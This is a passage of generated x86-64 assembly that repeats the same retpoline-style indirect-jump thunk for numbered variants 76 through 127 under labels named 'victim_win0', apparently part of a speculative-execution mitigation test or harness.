	pause
	lfence
	jmp	.Lgg_retpol_cap_000075
.Lgg_retpol_setup_000075:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000075:
	jmp	.Lvictim_win0_continue
## Variant 76
.Lvictim_win0_var76:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000076
	jmp	.Lgg_retpol_after_000076
.Lgg_retpol_thunk_000076:
	callq	.Lgg_retpol_setup_000076
.Lgg_retpol_cap_000076:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000076
.Lgg_retpol_setup_000076:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000076:
	jmp	.Lvictim_win0_continue
## Variant 77
.Lvictim_win0_var77:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000077
	jmp	.Lgg_retpol_after_000077
.Lgg_retpol_thunk_000077:
	callq	.Lgg_retpol_setup_000077
.Lgg_retpol_cap_000077:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000077
.Lgg_retpol_setup_000077:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000077:
	jmp	.Lvictim_win0_continue
## Variant 78
.Lvictim_win0_var78:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000078
	jmp	.Lgg_retpol_after_000078
.Lgg_retpol_thunk_000078:
	callq	.Lgg_retpol_setup_000078
.Lgg_retpol_cap_000078:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000078
.Lgg_retpol_setup_000078:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000078:
	jmp	.Lvictim_win0_continue
## Variant 79
.Lvictim_win0_var79:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000079
	jmp	.Lgg_retpol_after_000079
.Lgg_retpol_thunk_000079:
	callq	.Lgg_retpol_setup_000079
.Lgg_retpol_cap_000079:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000079
.Lgg_retpol_setup_000079:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000079:
	jmp	.Lvictim_win0_continue
## Variant 80
.Lvictim_win0_var80:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000080
	jmp	.Lgg_retpol_after_000080
.Lgg_retpol_thunk_000080:
	callq	.Lgg_retpol_setup_000080
.Lgg_retpol_cap_000080:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000080
.Lgg_retpol_setup_000080:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000080:
	jmp	.Lvictim_win0_continue
## Variant 81
.Lvictim_win0_var81:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000081
	jmp	.Lgg_retpol_after_000081
.Lgg_retpol_thunk_000081:
	callq	.Lgg_retpol_setup_000081
.Lgg_retpol_cap_000081:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000081
.Lgg_retpol_setup_000081:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000081:
	jmp	.Lvictim_win0_continue
## Variant 82
.Lvictim_win0_var82:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000082
	jmp	.Lgg_retpol_after_000082
.Lgg_retpol_thunk_000082:
	callq	.Lgg_retpol_setup_000082
.Lgg_retpol_cap_000082:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000082
.Lgg_retpol_setup_000082:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000082:
	jmp	.Lvictim_win0_continue
## Variant 83
.Lvictim_win0_var83:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000083
	jmp	.Lgg_retpol_after_000083
.Lgg_retpol_thunk_000083:
	callq	.Lgg_retpol_setup_000083
.Lgg_retpol_cap_000083:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000083
.Lgg_retpol_setup_000083:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000083:
	jmp	.Lvictim_win0_continue
## Variant 84
.Lvictim_win0_var84:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000084
	jmp	.Lgg_retpol_after_000084
.Lgg_retpol_thunk_000084:
	callq	.Lgg_retpol_setup_000084
.Lgg_retpol_cap_000084:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000084
.Lgg_retpol_setup_000084:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000084:
	jmp	.Lvictim_win0_continue
## Variant 85
.Lvictim_win0_var85:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000085
	jmp	.Lgg_retpol_after_000085
.Lgg_retpol_thunk_000085:
	callq	.Lgg_retpol_setup_000085
.Lgg_retpol_cap_000085:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000085
.Lgg_retpol_setup_000085:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000085:
	jmp	.Lvictim_win0_continue
## Variant 86
.Lvictim_win0_var86:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000086
	jmp	.Lgg_retpol_after_000086
.Lgg_retpol_thunk_000086:
	callq	.Lgg_retpol_setup_000086
.Lgg_retpol_cap_000086:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000086
.Lgg_retpol_setup_000086:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000086:
	jmp	.Lvictim_win0_continue
## Variant 87
.Lvictim_win0_var87:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000087
	jmp	.Lgg_retpol_after_000087
.Lgg_retpol_thunk_000087:
	callq	.Lgg_retpol_setup_000087
.Lgg_retpol_cap_000087:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000087
.Lgg_retpol_setup_000087:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000087:
	jmp	.Lvictim_win0_continue
## Variant 88
.Lvictim_win0_var88:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000088
	jmp	.Lgg_retpol_after_000088
.Lgg_retpol_thunk_000088:
	callq	.Lgg_retpol_setup_000088
.Lgg_retpol_cap_000088:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000088
.Lgg_retpol_setup_000088:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000088:
	jmp	.Lvictim_win0_continue
## Variant 89
.Lvictim_win0_var89:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000089
	jmp	.Lgg_retpol_after_000089
.Lgg_retpol_thunk_000089:
	callq	.Lgg_retpol_setup_000089
.Lgg_retpol_cap_000089:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000089
.Lgg_retpol_setup_000089:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000089:
	jmp	.Lvictim_win0_continue
## Variant 90
.Lvictim_win0_var90:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000090
	jmp	.Lgg_retpol_after_000090
.Lgg_retpol_thunk_000090:
	callq	.Lgg_retpol_setup_000090
.Lgg_retpol_cap_000090:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000090
.Lgg_retpol_setup_000090:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000090:
	jmp	.Lvictim_win0_continue
## Variant 91
.Lvictim_win0_var91:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000091
	jmp	.Lgg_retpol_after_000091
.Lgg_retpol_thunk_000091:
	callq	.Lgg_retpol_setup_000091
.Lgg_retpol_cap_000091:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000091
.Lgg_retpol_setup_000091:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000091:
	jmp	.Lvictim_win0_continue
## Variant 92
.Lvictim_win0_var92:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000092
	jmp	.Lgg_retpol_after_000092
.Lgg_retpol_thunk_000092:
	callq	.Lgg_retpol_setup_000092
.Lgg_retpol_cap_000092:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000092
.Lgg_retpol_setup_000092:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000092:
	jmp	.Lvictim_win0_continue
## Variant 93
.Lvictim_win0_var93:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000093
	jmp	.Lgg_retpol_after_000093
.Lgg_retpol_thunk_000093:
	callq	.Lgg_retpol_setup_000093
.Lgg_retpol_cap_000093:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000093
.Lgg_retpol_setup_000093:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000093:
	jmp	.Lvictim_win0_continue
## Variant 94
.Lvictim_win0_var94:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000094
	jmp	.Lgg_retpol_after_000094
.Lgg_retpol_thunk_000094:
	callq	.Lgg_retpol_setup_000094
.Lgg_retpol_cap_000094:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000094
.Lgg_retpol_setup_000094:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000094:
	jmp	.Lvictim_win0_continue
## Variant 95
.Lvictim_win0_var95:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000095
	jmp	.Lgg_retpol_after_000095
.Lgg_retpol_thunk_000095:
	callq	.Lgg_retpol_setup_000095
.Lgg_retpol_cap_000095:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000095
.Lgg_retpol_setup_000095:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000095:
	jmp	.Lvictim_win0_continue
## Variant 96
.Lvictim_win0_var96:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000096
	jmp	.Lgg_retpol_after_000096
.Lgg_retpol_thunk_000096:
	callq	.Lgg_retpol_setup_000096
.Lgg_retpol_cap_000096:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000096
.Lgg_retpol_setup_000096:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000096:
	jmp	.Lvictim_win0_continue
## Variant 97
.Lvictim_win0_var97:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000097
	jmp	.Lgg_retpol_after_000097
.Lgg_retpol_thunk_000097:
	callq	.Lgg_retpol_setup_000097
.Lgg_retpol_cap_000097:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000097
.Lgg_retpol_setup_000097:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000097:
	jmp	.Lvictim_win0_continue
## Variant 98
.Lvictim_win0_var98:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000098
	jmp	.Lgg_retpol_after_000098
.Lgg_retpol_thunk_000098:
	callq	.Lgg_retpol_setup_000098
.Lgg_retpol_cap_000098:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000098
.Lgg_retpol_setup_000098:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000098:
	jmp	.Lvictim_win0_continue
## Variant 99
.Lvictim_win0_var99:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000099
	jmp	.Lgg_retpol_after_000099
.Lgg_retpol_thunk_000099:
	callq	.Lgg_retpol_setup_000099
.Lgg_retpol_cap_000099:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000099
.Lgg_retpol_setup_000099:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000099:
	jmp	.Lvictim_win0_continue
## Variant 100
.Lvictim_win0_var100:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000100
	jmp	.Lgg_retpol_after_000100
.Lgg_retpol_thunk_000100:
	callq	.Lgg_retpol_setup_000100
.Lgg_retpol_cap_000100:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000100
.Lgg_retpol_setup_000100:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000100:
	jmp	.Lvictim_win0_continue
## Variant 101
.Lvictim_win0_var101:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000101
	jmp	.Lgg_retpol_after_000101
.Lgg_retpol_thunk_000101:
	callq	.Lgg_retpol_setup_000101
.Lgg_retpol_cap_000101:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000101
.Lgg_retpol_setup_000101:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000101:
	jmp	.Lvictim_win0_continue
## Variant 102
.Lvictim_win0_var102:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000102
	jmp	.Lgg_retpol_after_000102
.Lgg_retpol_thunk_000102:
	callq	.Lgg_retpol_setup_000102
.Lgg_retpol_cap_000102:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000102
.Lgg_retpol_setup_000102:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000102:
	jmp	.Lvictim_win0_continue
## Variant 103
.Lvictim_win0_var103:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000103
	jmp	.Lgg_retpol_after_000103
.Lgg_retpol_thunk_000103:
	callq	.Lgg_retpol_setup_000103
.Lgg_retpol_cap_000103:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000103
.Lgg_retpol_setup_000103:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000103:
	jmp	.Lvictim_win0_continue
## Variant 104
.Lvictim_win0_var104:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000104
	jmp	.Lgg_retpol_after_000104
.Lgg_retpol_thunk_000104:
	callq	.Lgg_retpol_setup_000104
.Lgg_retpol_cap_000104:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000104
.Lgg_retpol_setup_000104:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000104:
	jmp	.Lvictim_win0_continue
## Variant 105
.Lvictim_win0_var105:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000105
	jmp	.Lgg_retpol_after_000105
.Lgg_retpol_thunk_000105:
	callq	.Lgg_retpol_setup_000105
.Lgg_retpol_cap_000105:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000105
.Lgg_retpol_setup_000105:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000105:
	jmp	.Lvictim_win0_continue
## Variant 106
.Lvictim_win0_var106:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000106
	jmp	.Lgg_retpol_after_000106
.Lgg_retpol_thunk_000106:
	callq	.Lgg_retpol_setup_000106
.Lgg_retpol_cap_000106:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000106
.Lgg_retpol_setup_000106:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000106:
	jmp	.Lvictim_win0_continue
## Variant 107
.Lvictim_win0_var107:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000107
	jmp	.Lgg_retpol_after_000107
.Lgg_retpol_thunk_000107:
	callq	.Lgg_retpol_setup_000107
.Lgg_retpol_cap_000107:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000107
.Lgg_retpol_setup_000107:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000107:
	jmp	.Lvictim_win0_continue
## Variant 108
.Lvictim_win0_var108:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000108
	jmp	.Lgg_retpol_after_000108
.Lgg_retpol_thunk_000108:
	callq	.Lgg_retpol_setup_000108
.Lgg_retpol_cap_000108:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000108
.Lgg_retpol_setup_000108:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000108:
	jmp	.Lvictim_win0_continue
## Variant 109
.Lvictim_win0_var109:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000109
	jmp	.Lgg_retpol_after_000109
.Lgg_retpol_thunk_000109:
	callq	.Lgg_retpol_setup_000109
.Lgg_retpol_cap_000109:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000109
.Lgg_retpol_setup_000109:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000109:
	jmp	.Lvictim_win0_continue
## Variant 110
.Lvictim_win0_var110:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000110
	jmp	.Lgg_retpol_after_000110
.Lgg_retpol_thunk_000110:
	callq	.Lgg_retpol_setup_000110
.Lgg_retpol_cap_000110:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000110
.Lgg_retpol_setup_000110:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000110:
	jmp	.Lvictim_win0_continue
## Variant 111
.Lvictim_win0_var111:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000111
	jmp	.Lgg_retpol_after_000111
.Lgg_retpol_thunk_000111:
	callq	.Lgg_retpol_setup_000111
.Lgg_retpol_cap_000111:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000111
.Lgg_retpol_setup_000111:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000111:
	jmp	.Lvictim_win0_continue
## Variant 112
.Lvictim_win0_var112:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000112
	jmp	.Lgg_retpol_after_000112
.Lgg_retpol_thunk_000112:
	callq	.Lgg_retpol_setup_000112
.Lgg_retpol_cap_000112:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000112
.Lgg_retpol_setup_000112:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000112:
	jmp	.Lvictim_win0_continue
## Variant 113
.Lvictim_win0_var113:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000113
	jmp	.Lgg_retpol_after_000113
.Lgg_retpol_thunk_000113:
	callq	.Lgg_retpol_setup_000113
.Lgg_retpol_cap_000113:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000113
.Lgg_retpol_setup_000113:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000113:
	jmp	.Lvictim_win0_continue
## Variant 114
.Lvictim_win0_var114:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000114
	jmp	.Lgg_retpol_after_000114
.Lgg_retpol_thunk_000114:
	callq	.Lgg_retpol_setup_000114
.Lgg_retpol_cap_000114:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000114
.Lgg_retpol_setup_000114:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000114:
	jmp	.Lvictim_win0_continue
## Variant 115
.Lvictim_win0_var115:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000115
	jmp	.Lgg_retpol_after_000115
.Lgg_retpol_thunk_000115:
	callq	.Lgg_retpol_setup_000115
.Lgg_retpol_cap_000115:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000115
.Lgg_retpol_setup_000115:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000115:
	jmp	.Lvictim_win0_continue
## Variant 116
.Lvictim_win0_var116:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000116
	jmp	.Lgg_retpol_after_000116
.Lgg_retpol_thunk_000116:
	callq	.Lgg_retpol_setup_000116
.Lgg_retpol_cap_000116:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000116
.Lgg_retpol_setup_000116:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000116:
	jmp	.Lvictim_win0_continue
## Variant 117
.Lvictim_win0_var117:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000117
	jmp	.Lgg_retpol_after_000117
.Lgg_retpol_thunk_000117:
	callq	.Lgg_retpol_setup_000117
.Lgg_retpol_cap_000117:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000117
.Lgg_retpol_setup_000117:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000117:
	jmp	.Lvictim_win0_continue
## Variant 118
.Lvictim_win0_var118:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000118
	jmp	.Lgg_retpol_after_000118
.Lgg_retpol_thunk_000118:
	callq	.Lgg_retpol_setup_000118
.Lgg_retpol_cap_000118:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000118
.Lgg_retpol_setup_000118:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000118:
	jmp	.Lvictim_win0_continue
## Variant 119
.Lvictim_win0_var119:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000119
	jmp	.Lgg_retpol_after_000119
.Lgg_retpol_thunk_000119:
	callq	.Lgg_retpol_setup_000119
.Lgg_retpol_cap_000119:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000119
.Lgg_retpol_setup_000119:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000119:
	jmp	.Lvictim_win0_continue
## Variant 120
.Lvictim_win0_var120:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000120
	jmp	.Lgg_retpol_after_000120
.Lgg_retpol_thunk_000120:
	callq	.Lgg_retpol_setup_000120
.Lgg_retpol_cap_000120:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000120
.Lgg_retpol_setup_000120:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000120:
	jmp	.Lvictim_win0_continue
## Variant 121
.Lvictim_win0_var121:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000121
	jmp	.Lgg_retpol_after_000121
.Lgg_retpol_thunk_000121:
	callq	.Lgg_retpol_setup_000121
.Lgg_retpol_cap_000121:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000121
.Lgg_retpol_setup_000121:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000121:
	jmp	.Lvictim_win0_continue
## Variant 122
.Lvictim_win0_var122:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000122
	jmp	.Lgg_retpol_after_000122
.Lgg_retpol_thunk_000122:
	callq	.Lgg_retpol_setup_000122
.Lgg_retpol_cap_000122:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000122
.Lgg_retpol_setup_000122:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000122:
	jmp	.Lvictim_win0_continue
## Variant 123
.Lvictim_win0_var123:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000123
	jmp	.Lgg_retpol_after_000123
.Lgg_retpol_thunk_000123:
	callq	.Lgg_retpol_setup_000123
.Lgg_retpol_cap_000123:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000123
.Lgg_retpol_setup_000123:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000123:
	jmp	.Lvictim_win0_continue
## Variant 124
.Lvictim_win0_var124:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000124
	jmp	.Lgg_retpol_after_000124
.Lgg_retpol_thunk_000124:
	callq	.Lgg_retpol_setup_000124
.Lgg_retpol_cap_000124:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000124
.Lgg_retpol_setup_000124:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000124:
	jmp	.Lvictim_win0_continue
## Variant 125
.Lvictim_win0_var125:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000125
	jmp	.Lgg_retpol_after_000125
.Lgg_retpol_thunk_000125:
	callq	.Lgg_retpol_setup_000125
.Lgg_retpol_cap_000125:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000125
.Lgg_retpol_setup_000125:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000125:
	jmp	.Lvictim_win0_continue
## Variant 126
.Lvictim_win0_var126:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000126
	jmp	.Lgg_retpol_after_000126
.Lgg_retpol_thunk_000126:
	callq	.Lgg_retpol_setup_000126
.Lgg_retpol_cap_000126:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000126
.Lgg_retpol_setup_000126:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000126:
	jmp	.Lvictim_win0_continue
## Variant 127
.Lvictim_win0_var127:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000127
	jmp	.Lgg_retpol_after_000127
.Lgg_retpol_thunk_000127:
	callq	.Lgg_retpol_setup_000127
.Lgg_retpol_cap_000127:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000127
.Lgg_retpol_setup_000127:
	movq	%rbx, (%rsp)
	ret
